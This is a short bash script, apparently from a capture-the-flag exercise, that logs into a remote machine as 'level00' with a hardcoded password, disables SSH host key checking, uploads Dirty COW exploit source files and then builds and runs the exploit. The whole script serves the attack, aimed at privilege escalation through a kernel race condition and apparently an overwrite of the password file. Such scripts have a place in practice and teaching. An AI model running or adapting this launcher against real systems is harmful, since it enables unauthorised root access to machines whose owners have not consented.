#!/usr/bin/env bash

SCRIPT='
rm /tmp/passwd.bkp
cd /dev/shm/
ls /dev/shm/
make
./dirtycow cow cow
'

if [ ! -z "$1" ] && [ ! -z "$2" ]; then
    sshpass -p level00 scp -o StrictHostKeyChecking=no -P $2 Makefile dirtycow.c dirtycow.h getflags level00@$1:/dev/shm
    sshpass -p level00 ssh -o StrictHostKeyChecking=no level00@$1 -p $2 "$SCRIPT"
else
    echo "Usage: ./flags.sh <ip address> <port>"
fi
